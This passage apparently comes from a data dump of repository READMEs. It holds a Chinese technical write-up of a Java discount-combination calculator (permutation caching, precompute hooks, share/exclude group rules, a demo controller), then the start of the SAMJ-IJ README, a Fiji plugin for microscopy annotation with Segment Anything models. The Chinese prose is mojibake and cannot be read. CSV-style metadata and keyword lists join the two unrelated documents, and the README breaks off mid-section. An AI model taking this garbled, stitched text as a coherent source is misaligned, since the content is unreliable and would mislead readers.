      //å‰ç½®è®¡ç®— 1-SUPPORTEDSIZE ä¹‹é—´æ‰€æœ‰æ’åˆ—ç»„åˆ
    for(byte i=1;i<=SUPPORTEDSIZE;i++){
       PERMUTATIONS.put((int)i,Collections2.permutations(IntStream.range(0,i).boxed().map(x->(byte)x.intValue()).collect(Collectors.toList())));
      }
  }

```

- $A_n^3$çº§åˆ«ç¼“å­˜

ç›¸å¯¹äºä¼ ç»Ÿçš„`Key-Value`ç»“æ„ï¼Œè§£å†³ $A_n^n$é—®é¢˜çš„ç¼“å­˜éœ€è¦è¿›è¡Œç‰¹æ®Šè®¾è®¡ï¼Œå¯¹äºä¸€ä¸ªä¼˜æƒ é›†åˆè€Œè¨€ï¼Œ $A_n^3$æ„å‘³ç€éœ€è¦ç¼“å­˜*n*Ã—(*n*âˆ’1)Ã—(*n*âˆ’2)æ¡æ•°æ®ã€‚å½“n=7æ—¶ï¼Œéœ€è¦ç¼“å­˜210æ¡æ•°æ®ã€‚ä¸ºäº†åœ¨å†…å­˜å¤§å°å’Œç¼“å­˜å¸¦æ¥çš„æ€§èƒ½æ”¶ç›Šä¹‹é—´å–å¾—å¹³è¡¡ï¼Œ $A_n^3$æ˜¯æœ€åˆé€‚çš„çº§åˆ«ã€‚

`Permutation`ç±»é€šè¿‡å…¶æˆå‘˜å˜é‡`cache`å®ç°äº†é«˜æ€§èƒ½ç¼“å­˜ã€‚

```Java
private final Map<Integer, CalcState<T>> cache = Maps.newHashMap();
```
ä½ æˆ–è®¸å·²ç»æ³¨æ„åˆ°ï¼Œ`cache`çš„é”®å€¼ä½¿ç”¨çš„æ˜¯`Integer`ç±»å‹ã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æ›´å€¾å‘äºä½¿ç”¨`String`ç±»å‹ï¼Œä½†åœ¨éœ€è¦è¿›è¡Œå¤§é‡è®¡ç®—çš„åœºæ™¯ä¸­ï¼Œæ¯”å¦‚åœ¨ä¸‡æ¬¡è®¡ç®—çš„åœºæ™¯ä¸‹ï¼ŒStringå­—ç¬¦ä¸²çš„æ‹¼æ¥å´æˆäº†æ€§èƒ½ç“¶é¢ˆã€‚

ä¸ºäº†å®ç°é«˜æ€§èƒ½çš„é”®ç”Ÿæˆï¼Œ`Permutation`é‡‡ç”¨äº†ç‹¬ç‰¹çš„æ–¹æ³•ã€‚å®ƒé€šè¿‡ä½ç§»å¯¹`Byte`æ•°ç»„çš„å‰ä¸‰ä¸ªå­—èŠ‚è¿›è¡Œæ‰°åŠ¨ï¼Œä»¥ç¡®ä¿æ¯ä¸ªé”®çš„å”¯ä¸€æ€§ï¼ŒåŒæ—¶æå‡æ€§èƒ½ã€‚

```Java
private static Integer calcKey(List<Byte> a){
       return  a.size()>=3?(a.get(0) << 6)+ (a.get(1) << 3) + a.get(2):0;
}
```

`Permutation`æä¾›äº†ä¿å­˜ç‚¹æ¥å®ç°  $A_n^3$ çº§åˆ«ç¼“å­˜ï¼Œ`CalcState` è®°å½•äº†è®¡ç®—åˆ°ç¬¬3æ­¥çš„çŠ¶æ€ï¼ŒåŒ…æ‹¬å½“å‰è®¢å•ä¼˜æƒ é‡‘é¢å’Œè®¡ç®—è¿‡ç¨‹ã€å·²äº«ç”¨ä¼˜æƒ çš„å•†å“ç­‰ï¼Œè¿™äº›å±æ€§çš„ä¿å­˜å’Œå›æ”¾`Permutation`å·²ç»å¸®ä½ åšå¥½äº†ï¼Œ`Permutation`é¢å¤–æä¾›äº†æŠ½è±¡çš„ä¿å­˜å’Œå›æ”¾æ–¹æ³•æ¥æ»¡è¶³ä½ çš„ä¸ªæ€§åŒ–è¯‰æ±‚ã€‚

```Java
   /**
     * ä¸šåŠ¡å°†çŠ¶æ€è®°å½•åˆ°ä¿å­˜ç‚¹
     * @param state ä¿å­˜ç‚¹å¯¹è±¡
     */
    protected abstract void makeSnapshot(CalcState<T> state,DiscountContext<T> context);

    /**
     * ä¸šåŠ¡è¿”å›ä¿å­˜ç‚¹çŠ¶æ€
     * @param state ä¿å­˜ç‚¹å¯¹è±¡
     */
    protected abstract void backToSnapshot(CalcState<T> state,DiscountContext<T> context);
```

åœ¨ä¼˜æƒ è®¡ç®—ä¸­ï¼Œå­˜åœ¨ä¸€ä¸ªä¼˜å…ˆçº§è§„åˆ™ï¼Œå³ä¼˜æƒ è®¡ç®—æ˜¯æœ‰ä¼˜å…ˆçº§çš„ï¼Œéœ€è¦ç¡®ä¿å±æ€§`calculateGroup`å€¼è¾ƒå°çš„ä¼˜æƒ å…ˆè¡Œè®¡ç®—ã€‚å½“å‘ç”Ÿ`backToSnapshot`æ—¶ï¼Œæˆ‘ä»¬éœ€è¦é¢å¤–æ£€æŸ¥ç¼“å­˜ä¸­æœ€åä¸€ä¸ªä¼˜æƒ ä¸å½“å‰æ­£å‡†å¤‡è¦è®¡ç®—çš„ä¼˜æƒ ä¹‹é—´çš„å…³ç³»ï¼Œå¦‚æœä¸æ»¡è¶³ç‰¹å®šæ¡ä»¶ï¼Œåˆ™ç›´æ¥ç»ˆæ­¢è®¡ç®—ï¼Œç›´æ¥è·³å‡ºã€‚è€Œ`checkIfWakeUpJump`æ–¹æ³•ä¼šåœ¨ç¼“å­˜è¢«ä½¿ç”¨åç«‹å³åˆ¤æ–­æ˜¯å¦éœ€è¦ç»§ç»­ä¸‹å»ã€‚

#### ä¸Šä¸‹æ–‡ç±» DiscountContext&lt;T extends GoodsItem&gt;

`DiscountContext`æ˜¯ä¸Šä¸‹æ–‡ï¼Œä¹Ÿæ˜¯`Permutation`çš„æˆå‘˜å˜é‡ï¼Œ`DiscountContext`åŒæ ·åŒ…å«å¾ˆå¤šä¼˜åŒ–ç­–ç•¥ï¼š

- CalcStageæ•°ç»„

åœ¨å˜æ›´æœ€é¢‘ç¹ä¹Ÿæ˜¯æœ€é‡è¦çš„è®¡ç®—æ­¥éª¤å¯¹è±¡`CalcStage`ä½¿ç”¨æ•°ç»„å­˜å‚¨ï¼Œè¯¥æ•°ç»„éšç€ä¸Šä¸‹æ–‡åˆ›å»ºè€Œåˆ›å»ºï¼Œåœ¨`Permutation`ä¸­ä½¿ç”¨

```Java
Arrays.fill(arr,null);
```

å°†è¯¥æ•°ç»„æ¸…ç©ºå¹¶è®©å®ƒæŠ•å…¥ä¸‹ä¸€æ¬¡è®¡ç®—ï¼Œè¿™æ ·ä¸€æ¬¡å…¨æ’åˆ—è¿‡ç¨‹ä¸­ï¼Œæ•°ç»„åªä¼šè¢«åˆ›å»ºä¸€æ¬¡ï¼Œé¿å…äº†é¢‘ç¹åˆ›å»ºæ•°ç»„å¸¦æ¥çš„æ€§èƒ½æŸè€—ã€‚

- é¢„è®¡ç®—

`DiscountContext`çš„åˆå§‹åŒ–æ˜¯é€šè¿‡é™æ€çš„`create`æ–¹æ³•å®Œæˆçš„ï¼Œè¯¥æ–¹æ³•å°†å•†å“ä¸ä¼˜æƒ ç»‘å®šåœ¨ä¸€èµ·ï¼ŒåŒæ—¶æ‰§è¡Œä¸€äº›ç”¨æˆ·è‡ªå®šä¹‰çš„é€»è¾‘ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºâ€œé¢„è®¡ç®—â€ï¼Œé¢„è®¡ç®—çš„ç»“æœè¢«ä¿å­˜åœ¨`DiscountContext`çš„`preCompute`å±æ€§ä¸­ï¼Œä»¥ä¾¿åœ¨åç»­çš„è®¡ç®—ä¸­ç›´æ¥å–ç”¨ï¼Œè¿™ç§æ–¹æ³•é¿å…äº†åœ¨åç»­çš„é«˜é€Ÿè¿­ä»£ä¸­é‡å¤æ‰§è¡Œç›¸åŒçš„æ“ä½œï¼Œå¦‚å•†å“åˆ†ç»„å’Œã€æ±‚å’Œç­‰ï¼Œä»è€Œæé«˜äº†è®¡ç®—æ•ˆç‡ã€‚

#### é¢„è®¡ç®— PreCompute&lt;T extends GoodsItem&gt;

é¢„è®¡ç®—æä¾›äº†æ¥å£ï¼Œè¦ä½¿ç”¨é¢„è®¡ç®—é¦–å…ˆéœ€è¦å®ç°PreComputeæ¥å£

```Java
public interface PreCompute<T extends GoodsItem> {
    /**
     * åˆ¤æ–­ç¬¦åˆæ¡ä»¶çš„æ´»åŠ¨ç±»å‹ï¼Œç¬¦åˆæ‰ä¼šæ‰§è¡ŒpreComputeItems
     */
    Set<String> matchTypes();

    /**
     * å¯¹å•†å“åšä¸€äº›å¤æ‚é›†åˆæ“ä½œ
     * @param items å½“å‰å‚ä¸ä¼˜æƒ çš„å•†å“
     * @param discount å½“å‰ä¼˜æƒ 
     * @param preCompute å­˜å‚¨è®¡ç®—çš„ç»“æœ
     */
     void preComputeItems(List<T> items, DiscountWrapper discount, Map<String,Object> preCompute);
}
```

æ­¤å¤–éœ€è¦åœ¨èµ„æºç›®å½•ä¸‹å»ºç«‹`calculator-core.properties`æ–‡ä»¶ï¼Œé…ç½®å†…å®¹å¦‚ä¸‹

```Java
precompute.path=ä½ è¦æ‰«æçš„åŒ…
```
`PreComputeHolder`å°†å¤„ç†æ‰€æœ‰çš„`PreCompute`å®ç°ç±»ï¼Œåªæœ‰`matchTypes`åŒ¹é…çš„æƒ…å†µä¸‹ï¼Œæ‰ä¼šæ‰§è¡Œ`preComputeItems`æ–¹æ³•ã€‚

```Java
public class PreComputeHolder {
    public static Set<PreCompute> COMPUTES= Sets.newHashSet();
    private final static String PATH = ""precompute.path"";

    static{
        Properties properties = new Properties();
        try {
              properties = PropertiesLoaderUtils.loadProperties(new FileSystemResource(Objects.requireNonNull(PreComputeHolder.class.getClassLoader().getResource(""calculator-core.properties"")).getPath()));
        } catch (Exception ignore) {
        }
        String path = properties.getProperty(PATH);
        if(StringUtils.isNotBlank(path)){
            Reflections reflections = new Reflections(path);
            Set<Class<? extends PreCompute>> subTypes = reflections.getSubTypesOf(PreCompute.class);
            for(Class<? extends PreCompute> clazz:subTypes){
                try {
                    COMPUTES.add(clazz.newInstance());
                } catch (Exception ignore) {
                }
            }
        }
    }
}
```

#### è®¡ç®—å™¨ Calculator

`Calculator`æ˜¯å•ä¸ªä¼˜æƒ çš„è®¡ç®—æ¥å£ï¼ˆå³ç”¨äºä¼˜æƒ è®¡ç®—çš„æ¥å£ï¼‰ï¼Œå®ƒå…¶ä¸­å®šä¹‰äº†ä¸€ä¸ª`calcWarp`æ–¹æ³•ï¼Œè´Ÿè´£å…·ä½“çš„ä¼˜æƒ è®¡ç®—é€»è¾‘ï¼Œä½†ç”±äº`calcWarp`éœ€è¦æ‰¿æ‹…ä¸€äº›å†…éƒ¨çš„äº‹æƒ…ï¼Œéœ€è¦å¤„ç†ä¸€äº›å†…éƒ¨ç»†èŠ‚ï¼Œå› æ­¤ä¸ºäº†ç®€åŒ–ä½¿ç”¨è€…çš„å¼€å‘å·¥ä½œï¼Œæˆ‘ä»¬æä¾›äº†ä¸€ä¸ªæŠ½è±¡ç±»`AbstractCalculator`ï¼Œå®ƒå®ç°äº†`calcWarp`æ–¹æ³•ï¼Œå¹¶æœ€ç»ˆæš´éœ²äº†ä¸€ä¸ªæ›´ç®€å•æ›´ç›´è§‚çš„`calc`æ–¹æ³•ä¾›ä½¿ç”¨è€…ä½¿ç”¨ã€‚

`AbstractCalculator`çš„å†…å®¹å¦‚ä¸‹ï¼Œåœ¨`AbstractCalculator`ä¸­ï¼Œ`calcWarp`æ–¹æ³•è´Ÿè´£åˆ›å»º`CalcStage`å¯¹è±¡ï¼Œç»´æŠ¤`CalcStage`æ•°ç»„ç­‰å†…éƒ¨å·¥ä½œï¼Œè¿™äº›ç»†èŠ‚å¯¹äºä½¿ç”¨è€…æ¥è¯´æ˜¯é€æ˜çš„ï¼Œä»–ä»¬åªéœ€è¦å…³æ³¨å¹¶å®ç°`calc`æ–¹æ³•å³å¯ã€‚

```Java
public abstract class AbstractCalculator<T extends GoodsItem> implements Calculator<T> {
    public long calcWarp(DiscountContext<T> context, DiscountWrapper discountWrapper, Map<Long, T> records, byte idx, int i) {
        CalcStage stage = new CalcStage();
        CalcResult cr = context.getCalcResult();
        long price= cr.getCurPrice();
        stage.setBeforeCalcPrice(price);
        price = calc(context, discountWrapper,records, price, stage);
        if(price<0){
            return price;
        }
        stage.setAfterCalcPrice(price);
        stage.setIndex(idx);
        stage.setStageType(discountWrapper.getType());
        cr.setCurPrice(price);
        if(stage.getBeforeCalcPrice()>stage.getAfterCalcPrice()) {
            cr.getCurStages()[i] = stage;
        }
        return price;
    }

    /**
     * è¿”å›è¯¥ä¼˜æƒ ä¸‹çš„æœ€ç»ˆè¦æ”¯ä»˜çš„é‡‘é¢,è‹¥ä¸ç¬¦åˆåˆ™è¿”å› prevStagePrice
     * @param context ä¸Šä¸‹æ–‡
     * @param discountWrapper ä¼˜æƒ ä¿¡æ¯
     * @param records è®°å½•äº«å—è¿‡ä¼˜æƒ çš„å•å“ï¼Œkeyæ˜¯calculateIdï¼Œè¿™é‡Œåªæä¾›å®¹å™¨ï¼Œæ·»åŠ å’Œåˆ¤æ–­è§„åˆ™ç”±ä½¿ç”¨è€…è‡ªè¡Œå†³å®š
     * @param prevStagePrice ä¸Šä¸€æ­¥è®¡ç®—çš„è®¢å•çš„ä»·æ ¼
     * @param curStage å½“å‰stage
     * @return
     */
    public abstract  long calc(DiscountContext<T> context, DiscountWrapper discountWrapper, Map<Long,T> records, long prevStagePrice, CalcStage curStage);

}

```
æœ€ç»ˆç”¨æˆ·é€šè¿‡ç»§æ‰¿`AbstractCalculator`ç±»ï¼Œå¹¶åœ¨`Component`æ³¨è§£ä¸­æŒ‡å®šä¸€ä¸ªå€¼ï¼Œè€Œ`CalculatorRouter`åˆ™é€šè¿‡è¿™ä¸ªå€¼å°†è¯·æ±‚è·¯ç”±åˆ°ç›¸åº”çš„ä¼˜æƒ è®¡ç®—å™¨ï¼Œè¿™ä¸ªå€¼ä¸`DiscountWrapper`ä¸­çš„`type`å±æ€§ç›¸å¯¹åº”ã€‚

```Java
@Component(""manjian"")
public class ManjianCalc extends AbstractCalculator<GoodsItem> {
......
}
```


#### å…±äº«äº’æ–¥åè®® DiscountGroup

å…±äº«äº’æ–¥åè®®æ˜¯ä¸€ä¸ªæ•°æ®ç»“æ„ï¼Œå®ƒæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œæ•°ç»„ä¸­æœ€å¤šå¯ä»¥åŒ…å«ä¸¤ä¸ªå¯¹è±¡ï¼Œæœ€å°‘åŒ…å«ä¸€ä¸ªå¯¹è±¡ã€‚å¦‚æœæ•°ç»„ä¸­åªæœ‰ä¸€ä¸ªå¯¹è±¡ï¼Œé‚£ä¹ˆè¯¥å¯¹è±¡å¿…ç„¶ä¸ºå…±äº«ç»„ï¼Œå³ç»„å†…çš„ä¼˜æƒ å¯ä»¥å åŠ ä½¿ç”¨ã€‚

```JavaScript
[
    {
        ""relation"": ""share"",
        ""items"":
        [
            {
                ""type"": ""activity0"",
                ""id"": ""11""
            }
            ,
            {
                ""type"": ""activity4"",
                ""id"": ""13""
            } 
            ,
            {
                ""type"": ""coupon1"",
                 ""id"": ""14""
            }
        ]
    }]
```
ç›¸åº”çš„ï¼Œå½“æ•°ç»„ä¸­åŒ…å«ä¸¤ä¸ªå¯¹è±¡æ—¶ï¼Œç¬¬ä¸€ä¸ªå¯¹è±¡çš„`relation`å±æ€§å¯ä»¥ä¸º`share`æˆ–`exclude`ï¼Œè€Œç¬¬äºŒä¸ªå¯¹è±¡çš„`relation`å±æ€§å¿…é¡»ä¸º`exclude`ã€‚

```JavaScript
[
    {
        ""relation"": ""share"",
        ""items"":
        [
            {
                ""type"": ""activity0"",
                ""id"": ""11""
            },
            {
                ""type"": ""card3"",
                ""id"":""12""
            }
        ]
    },
    {
        ""relation"": ""exclude"",
        ""items"":
        [
            {
                ""type"": ""card1"",
                ""id"": ""18""
            },
            {
                ""type"": ""coupon1"",
                ""id"": ""22""
            }
        ]
    }
]
```
æœ€ç»ˆï¼Œä¸Šè¿°åè®®å°†è½¬åŒ–ä¸ºå¦‚ä¸‹ä¸¤ä¸ªå…±äº«ç»„ï¼š

- `activity0-card3-card1` å’Œ `activity0-card3-coupon1`

å·¥å…·ç±» `DiscountGroupUtil` æä¾›äº†ä¸€ä¸ªæ–¹æ³•ï¼Œç”¨äºå°†åè®®è½¬æ¢ä¸ºå…±äº«ç»„ã€‚ç”±äºå…±äº«ç»„å¯èƒ½åŒ…å«å¤§é‡ä¼˜æƒ ï¼Œä¸ºäº†æé«˜è¿‡æ»¤æ€§èƒ½ï¼Œæˆ‘ä»¬å°†å½“å‰å¯ç”¨çš„ä¼˜æƒ è½¬æ¢ä¸ºäºŒçº§`Map`ã€‚è¿™ä¸ª`Map`çš„å¤–å±‚é”®æ˜¯åè®®ä¸­çš„`type`ï¼Œè€Œç¬¬äºŒå±‚é”®æ˜¯åè®®ä¸­çš„`id`ã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œæˆ‘ä»¬å¯ä»¥å¿«é€Ÿåœ°è¿›è¡Œäº¤å‰è¿‡æ»¤ï¼Œä»è€Œæå‡æ€§èƒ½ã€‚

```Java
public static List<Pair<Set<DiscountWrapper>,Set<DiscountWrapper>>> transform(List<List<DiscountGroup>> groups, Map<String, Map<String,DiscountWrapper>> inMap);
```
ä¸ºäº†ç¡®ä¿è®¡ç®—æ€§èƒ½ï¼Œæˆ‘ä»¬å°†ç”¨æˆ·åœ¨å½“å‰è®¢å•ä¸­å¯äº«å—çš„ä¼˜æƒ åˆ†ä¸ºä¸¤ä¸ªé›†åˆã€‚å·¦ä¾§é›†åˆçš„å¤§å°é™åˆ¶ä¸º`SUPPORTEDSIZE`ï¼Œå³æˆ‘ä»¬é‡ç‚¹ä¿éšœçš„ã€åœ¨è®¡ç®—èƒ½åŠ›èŒƒå›´å†…çš„ä¼˜æƒ ã€‚è€Œå³ä¾§é›†åˆåˆ™å°½å¯èƒ½åœ°è¿›è¡Œå åŠ ã€‚

ä»ç¨³å®šæ€§è§’åº¦è€ƒè™‘ï¼Œæˆ‘ä»¬éœ€è¦å¯¹è®¡ç®—æ¬¡æ•°è¿›è¡Œç»Ÿè®¡ã€‚åœ¨å‹åŠ›æµ‹è¯•ä¸­ï¼Œæˆ‘ä»¬é€šè¿‡`LimitingUtil.count`æ–¹æ³•æ¥ç»Ÿè®¡è¿›å…¥`calc`æ–¹æ³•çš„æ¬¡æ•°ã€‚æ˜¾ç„¶ï¼Œåœ¨æ²¡æœ‰å¼€å¯ç¼“å­˜çš„æƒ…å†µä¸‹ï¼Œè®¡ç®—æ¬¡æ•°ä¸º $A_n^n$Ã—nï¼Œè€Œå½“å¼€å¯ç¼“å­˜æ—¶ï¼Œè®¡ç®—æ¬¡æ•°ä¸º $A_n^n$Ã—(nâˆ’3)+ $A_n^3$ã€‚

#### CASE

çœ‹äº†è¿™ä¹ˆå¤šæ¦‚å¿µï¼Œæˆ‘ä»¬å¯ä»¥åœ¨`com.gch.discount.demo`åŒ…ä¸­æ‰¾åˆ°å®é™…è°ƒç”¨çš„å…·ä½“caseï¼š

```Java
@Controller
public class TestController {

    private final CalculatorRouter calculatorRouter;

    public TestController(CalculatorRouter calculatorRouter) {
        this.calculatorRouter = calculatorRouter;
    }

    @RequestMapping(""test"")
    @ResponseBody
    public Object test() {
        //mockå•†å“
        List<GoodsItem> items = mockItems();
        //mockç»„å…³ç³»å¹¶è½¬åŒ–ä¸ºå…±äº«ç»„
        List<Pair<Set<DiscountWrapper>,Set<DiscountWrapper>>> pairs = transform(mockGroups());
        //å…¨å±€æœ€ä¼˜è®¡ç®—è¿‡ç¨‹
        List<CalcStage> globalStages=Lists.newArrayList();
        int count = 0;
        //è®¢å•æ€»é‡‘é¢
        long totalPrice = items.stream().mapToLong(GoodsInfo::getSalePrice).sum();
        long globalPrice = totalPrice;
        //æ„å»ºè®¡ç®—æµ
        Flowable flowable = (Flowable) new Flowable().build(calculatorRouter);
        for(Pair<Set<DiscountWrapper>,Set<DiscountWrapper>> set:pairs) {
            //ç»Ÿè®¡ç®—åŠ›
            count += LimitingUtil.count(set.getLeft().size());
            if(count>N){
                break;
            }
            List<DiscountWrapper> wrappers = Lists.newArrayList(set.getLeft());
            DiscountContext<GoodsItem> ctx = DiscountContext.create(totalPrice, Lists.newArrayList(items), wrappers);
            flowable.perm(ctx);
            if(ctx.getCalcResult().getFinalPrice() < globalPrice) {
                globalStages = Arrays.asList(ctx.getCalcResult().getStages());
                globalPrice = ctx.getCalcResult().getFinalPrice();
            }
        }
        return Pair.of(globalPrice,globalStages);
    }

    private List<List<DiscountGroup>> mockGroups(){
        List<List<DiscountGroup>> groups = Lists.newArrayList();
        DiscountGroup group = new DiscountGroup();
        group.setRelation(GroupRelation.SHARE.getType());
        group.setItems(Lists.newArrayList(new Item(""zhekou"",""1""),new Item(""manjian"",""2""),new Item(""manzeng"",""3"")));
        groups.add(Lists.newArrayList(group));
        return groups;
    }

    private List<GoodsItem> mockItems(){
        IdGenerator idGenerator = IdGenerator.getInstance();
        GoodsInfo goodsInfo = GoodsInfo.of(1001L,2001L,null,4,20 * 100,""äº§å“1"",null);
        GoodsInfo goodsInfo2 = GoodsInfo.of(1001L,2002L,null,2,10 * 100,""äº§å“1"",null);
        List<GoodsItem> items = GoodsItem.generateItems(goodsInfo,idGenerator,x->x.getExtra().put(Constant.UPDATEABLEPRICE,x.getSalePrice()));
        items.addAll(GoodsItem.generateItems(goodsInfo2,idGenerator,x->x.getExtra().put(Constant.UPDATEABLEPRICE,x.getSalePrice())));
        return items;
    }

    private List<Pair<Set<DiscountWrapper>,Set<DiscountWrapper>>> transform(List<List<DiscountGroup>> groups){
        List<DiscountWrapper> wrapperList = Lists.newArrayList(
                DiscountWrapper.of(""zhekou"", ""1"", ""æŠ˜æ‰£"", false, new DiscountConfig()),
                DiscountWrapper.of(""manjian"", ""2"", ""æ»¡å‡"", false, new DiscountConfig())
        );
        Map<String, Map<String,DiscountWrapper>> inMap = wrapperList.stream().collect(Collectors.toMap(DiscountWrapper::getType, x->ImmutableMap.of(x.getId(),x)));
        return DiscountGroupUtil.transform(groups,inMap);
    }
}

```





",0,0,1,0.0,"['permutation', 'lt', 't', 'extend', 'goodsitem', 'gt', 'discountcontext', 'lt', 't', 'extend', 'goodsitem', 'gt', 'precompute', 'lt', 't', 'extend', 'goodsitem', 'gt', 'calculator', 'discountgroup', 'case']","['lt', 't', 'extend', 'goodsitem', 'gt']",1.0,[],0.0,1.0,0.0
segment-anything-models-java/SAMJ-IJ,main,"[![Build Status](https://github.com/segment-anything-models-java/SAMJ-IJ/actions/workflows/build.yml/badge.svg)](https://github.com/segment-anything-models-java/SAMJ-IJ/actions/workflows/build.yml)

# SAMJ-IJ

The SAMJ-IJ is a powerful Fiji plugin for annotating microscopy images using various versions of the [Segment Anything](https://github.com/facebookresearch/segment-anything) Model (SAM). This README provides detailed instructions on how to use the plugin for image annotation. In this first version of the plugin, the SAMJ-IJ Annotator is delivered to annotate images through the usage of prompts. The plugin is designed to be user-friendly and efficient, allowing for easy and accurate image annotation for further analysis.

> [!NOTE]
> This is an **EARLY RELEASE**, many more improvements are coming! Your valuable suggestions for enhancements are encouraged in the [Issues section](https://github.com/segment-anything-models-java/SAMJ-IJ/issues) or on the [image.sc forum](https://forum.image.sc/).

## Contents
- [Installation](#installation)
- [Model Installation](#model-installation)
- [Annotating Images](#annotating-images)
- [Saving Annotations](#saving-annotations)
- [Usage Example](#usage-example)
- [Use Cases](#use-cases)
- [Contributors](#contributors)
- [Notes](#notes)

## Fiji and Plugin Installation

Before you can annotate images using SAMJ-IJ, you need to install the plugin in Fiji:

1. **Install Fiji**: If you haven't already, download and install [Fiji](https://fiji.sc/).

> [!IMPORTANT]
> For MacOS users, if your Fiji instance is launched from the Downloads folder, SAMJ will not work! Move Fiji to another folder, Documents or Desktop, for example.

2. **Install SAMJ Plugin**: Open Fiji and navigate to `Help > Update...`. In the `Manage update sites` window, and look for an update site named `SAMJ`, select it, click on `Apply and close` and then `Apply changes`. Finally restart Fiji.

   If you cannot find `SAMJ` among the update sites list, click on `Add update site`/`Add unlisted site`, write `SAMJ` in the `Name` field and `https://sites.imagej.net/SAMJ/` in the `URL` field. Click on `Apply and close`, click on `Apply changes` and restart Fiji. 
![SAMJ Update site](./images/update-site-example.png)
5. **Open SAMJ-IJ Annotator**: Start Fiji and navigate to `Plugins > SAMJ > SAMJ Annotator` to open the plugin.

## Model Installation

To use the SAMJ-IJ plugin, you must install a SAM model. These are the models available for installation:
* **EfficientSAM:** A [base model](https://github.com/yformer/EfficientSAM/tree/main) designed for segmentation tasks, optimized for performance on standard computational resources. Ideal for accurate annotations and segmentations Computationally heavy. Do not use it on low-end computers.
* **EfficientViTSAM-l0:** A lightweight variant of the [EfficientViTSAM](https://arxiv.org/abs/2402.05008) model, offering a balance between segmentation accuracy and computational demand, suitable for use on regular computers.
* **EfficientViTSAM-l1:** An intermediate version, providing enhanced accuracy for complex segmentation tasks with manageable resource requirements.
* **EfficientViTSAM-l2:** A more advanced version designed for high-accuracy segmentation in demanding scenarios requiring higher computational resources.
* **EfficientViTSAM-xl0:** An extra-large model variant, pushing the boundaries of segmentation accuracy at the expense of increased computational demand.
* **EfficientViTSAM-xl1:** The most advanced and resource-intensive version, offering state-of-the-art segmentation performance for the most challenging tasks.

> [!WARNING]
> Users with a low-end computer are advised not to use the **EfficientSAM** model as it might take up to 10 minutes to load the first time, or the computer can even be frozen. The fastest and lightest model is **EfficientViTSAM-l0**, but low-resource machines might take up to 2-3 minutes to load the first time. Subsequent loading times will be much faster (~10s).

These are the steps to install a model:
1. Open the SAMJ Annotator plugin as described above.
2. Choose a SAM model from the list provided within the plugin.
3. Click on the `Install` button next to the selected model.
4. Wait for the installation process to complete. This may take some time, depending on the model size, your computer, and your internet connection.

> [!CAUTION]
> Model installation times vary based on your machine's specifications, ranging from seconds to up to 20 minutes. Please be patient.



This video demonstrates the live installation of EfficientViTSAM-l1 on a Mac M1.
![Installing EfficientViTSAM-l1](./images/installing-gif.gif)



## Annotating Images

Once you have installed a model, follow these steps to annotate your image:

1. **Open Image**: Open the microscopy image you want to annotate in Fiji.
2. **Select the Image**: In the SAMJ Annotator plugin, ensure your image is selected in the dropdown bar.
3. **Start Annotation**: Click on `Go!` to begin the annotation process. This button will encode your image so you can start annotating. It can take a while.
4. **Choose Annotation Method**: Use one of the following tools to annotate your image:
   - `Rectangle (Rect)`: Draw rectangular Regions Of Interest (ROIs).
   - `Points`: Click to mark points on the image. Hold `Ctrl` to select multiple points for a single object.
   - `Brush`: Paint freeform ROIs.

   Optionally, untick the `Add to ROI Manager` checkbox if you don't want your annotations to be added to the Fiji ROI Manager automatically.
   *Note: the first annotation can take several seconds.*
5. **Annotate**: Annotate as many objects as needed. With each ROI drawn using one of the three tools, the installed SAM version will run, and the object will be annotated.
6. **Manage Annotations**: All annotations will be sent to the ROI Manager (if the checkbox is ticked), where you can perform various operations as allowed by Fiji's ROI Manager functionality.

## Saving Annotations

### All ROIs or the largest one
To save your annotations, you can opt for either exporting every ROI using the ""Return all ROIs"" feature or selecting ""Only return the largest ROI"" to export solely the largest one. In the context of annotating heterogeneous images with various ROIs, as displayed below, you have the choice to either preserve the entirety of the ROIs, which would include every annotated object, such as the nuclei and the entire embryo or to conserve exclusively the predominant ROI, which, in this example, would be the complete embryo.

![Embryo Annotation](./images/allROI-largestROI.png)

### Export to Labelling

This button simplifies the process of exporting your annotations, which are saved as semantic annotations where each marked region is assigned a distinct value. For enhanced visual clarity, we suggest altering the Look-Up Table (LUT) in Fiji (Image > Lookup Tables > Glasbey or choose another option).


<p float=""center"">
  <img src=""/images/embryo.png"" width=""25%"" />
  <img src=""/images/embryo-nuclei-labeling.png"" width=""25%"" /> 
</p>


## Usage Example

Below is an illustration of object annotation using the SAMJ-IJ plugin. Each object is delineated and labelled to showcase the plugin's straightforward and efficient capabilities in image analysis.

![Usage Example](/images/usage-example.png)

Follow this comprehensive workflow to annotate your image with SAMJ-IJ:

1. **Model Installation**: Choose and install your preferred model for image annotation. Refer to [Model Installation](#model-installation) for detailed information on each model.
2. **Open Image in Fiji**: Navigate to `File > Open` in Fiji or drag and drop your image directly into the interface.
3. **Encode Image**: With the model installed and the image open, select your image from the dropdown menu and click `Go!` to encode it. This may take some time depending on your system's capabilities.
4. **Annotation**: Annotate your image freely. All annotations will appear in the ROI manager. For clarity, when dealing with numerous closely spaced ROIs, uncheck the `Labels` option in the ROI manager. See [Annotating Images](#annotating-images) for more details.
5. **Export Annotations**: Once finished with the annotations, click `Export to Labelling...` to save your semantic annotations.
6. **Enhance Visualization**: Improve the visibility of your mask by altering the LUT. For example, you can apply the Glasbey LUT via `Image > Lookup Tables > Glasbey`.

![Complete workflow](/images/complete-workflow-gif.gif)

## Use Cases
This Fiji plugin is intended to work with microscopy images. To show its versatility among different images, here are some use cases. 

![Use Cases of different annotations in microscpy images](images/annotation-examples.png)

#### a) Astrocytes stained for actin
The original image (top left in the figure) displays astrocytes stained for actin following mechanical deformation as part of a study exploring the mechanical and functional responses of astrocytes using magneto-active substrates [1]. The annotated image (bottom left in the figure) highlights individual astrocytes for detailed analysis. 
This annotation was accomplished using the ""Points Prompt"" feature coupled with the ""Return Only Largest ROI"" option to annotate each astrocyte visible in the image selectively. The primary goal of this annotation is to facilitate a comparative study of astrocyte morphology pre- and post-deformation, thus contributing valuable insights into the biomechanical properties and adaptive responses of astrocytes under stress.

#### b) Bacterial mobility on agar plates
